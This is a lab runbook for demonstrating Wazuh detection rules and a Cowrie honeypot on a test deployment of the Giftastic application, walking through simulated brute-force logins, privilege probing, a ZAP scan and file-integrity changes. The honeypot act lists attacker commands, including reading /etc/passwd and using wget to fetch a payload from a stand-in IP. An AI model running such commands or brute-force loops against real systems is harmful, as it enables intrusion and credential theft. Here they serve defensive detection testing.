# Demonstration Timeline

A controlled walkthrough that shows detection coverage across the application,
host, and decoy layers. It uses only lab systems and simulated or self-owned
traffic. Allow 30-40 minutes.

> Do **not** run OWASP ZAP, brute-force tools, or the honeypot scripts against
> production Giftastic, and do not point real users at the honeypot ports.

## Preparation

- [ ] Lab is running and `https://localhost` loads (`docker compose ps`).
- [ ] `.env` passwords changed from the defaults.
- [ ] A second terminal is open in `security-monitoring/`.
- [ ] For the live application demo: the backend runs locally with a test
      database and a test admin/vendor/customer account.
- [ ] For the honeypot demo: `cowrie` profile is up (`docker compose --profile
      cowrie ps`).

## Act 1 - Baseline (2 min)

Generate normal activity so the dashboard has a "known good" reference:

```bash
curl -s -o /dev/null http://localhost:8080/api/v1/products
# log in with a legitimate test account once
```

**Expected:** rule 100201 (successful login) at level 3. This establishes that
the pipeline works before attacks begin.

## Act 2 - Authentication attacks (5 min)

Either trip the rules with real failed logins:

```bash
for i in $(seq 1 10); do
  curl -s -o /dev/null -X POST http://localhost:8080/api/v1/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"email":"victim@example.com","password":"wrong"}'
done
```

or, without the backend, use the simulator:

```bash
./scripts/simulate-giftastic.sh
```

**Expected alerts:**

- 100210 (level 5) for each failure.
- 100211 (level 10) brute force once 8 failures from one IP occur within 120 s.
- 100250 (level 10) if a suspended account is used.

## Act 3 - Authorization probing (5 min)

With a low-privilege (customer or vendor) token, repeatedly call an
administrative or financial endpoint:

```bash
TOKEN="<customer-or-vendor-jwt>"
for path in admin/permissions admin/users commissions payments; do
  for i in 1 2 3; do
    curl -s -o /dev/null -w "%{http_code} $path\n" \
      -H "Authorization: Bearer $TOKEN" \
      "http://localhost:8080/api/v1/$path"
  done
done
```

**Expected alerts:**

- 100220 (level 7) for each denial.
- 100221 (level 10) repeated denials for one subject (privilege probing / IDOR).
- 100260 (level 12) denial on a sensitive path.

## Act 4 - OWASP ZAP baseline scan (7 min)

Run ZAP against the **local** backend only. A baseline scan exercises many
endpoints and produces a mix of 200/400/401/403 responses.

1. Start ZAP and run an automated scan with the local API as the target.
2. While ZAP runs, watch the audit log fill with `authn.required` and
   `authz.access.denied` events.

**Expected alerts:**

- 100230 (level 3) unauthenticated access.
- 100231 (level 9) repeated unauthenticated access from one IP.
- 100240/100241 (level 6/10) rate-limit violations if the scan is aggressive
  enough to hit the backend's limit.
- FIM/SCA noise is unrelated to ZAP but may appear; note it as host-layer
  context rather than application findings.

This act shows the same rule set detecting a real automated scanner rather than
hand-crafted events.

## Act 5 - Cowrie honeypot (7 min)

Real interaction (Linux/macOS with `sshpass`):

```bash
./scripts/simulate-cowrie.sh
```

or on any platform, emit equivalent events:

```powershell
.\scripts\simulate-cowrie.ps1
```

Optionally connect by hand to feel the decoy:

```bash
ssh -p 2222 root@localhost          # try root/password
telnet localhost 2223
```

Then run a short sequence inside the decoy shell: `id`, `uname -a`,
`cat /etc/passwd`, `wget http://198.51.100.9/payload.sh`, `chmod +x payload.sh`,
`crontab -l`.

**Expected alerts:**

- 100310 (level 6) failed logins; 100312 (level 10) brute force.
- 100311 (level 9) successful honeypot login.
- 100320 (level 8) attacker command.
- 100321 (level 12) payload download; 100322 (level 10) permission change;
  100323 (level 12) persistence; 100324 (level 12) credential discovery.

## Act 6 - Host file-integrity (3 min)

On the agent host, modify a monitored file (for example append a comment to a
configuration file under the monitored application path).

**Expected alerts:** Wazuh FIM rules (syscheck group), including the file path,
the change type, and the agent hostname. This is the host-layer signal that
gives application alerts context.

## Act 7 - Triage in the dashboard (8 min)

1. Open **Threat Hunting** and filter by `rule.groups: giftastic`.
2. Open the brute-force alert and pivot on `data.source_ip` to see every event
   from that source across the timeline.
3. Filter by `rule.groups: cowrie` and compare attacker source IPs with the
   application events.
4. Show the level-12 sensitive-path denial and walk through why it is escalated.
5. (Optional) Create a saved search or dashboard for "Giftastic security
   events" grouping rules by level and group.

## Cleanup

```bash
docker compose down            # keeps data volumes
docker compose down -v         # wipes alerts and certs/data
```

Remove any test accounts, tokens, and simulated log files from the backend host.

## Validation fallback

If any rule does not fire, validate the event directly against the ruleset:

```bash
docker compose exec wazuh.manager /var/ossec/bin/wazuh-logtest
```

Paste one JSON line and confirm the decoder is `json` and the expected rule id
matches. This is the fastest way to separate a logging problem from a rule
problem during a demo.
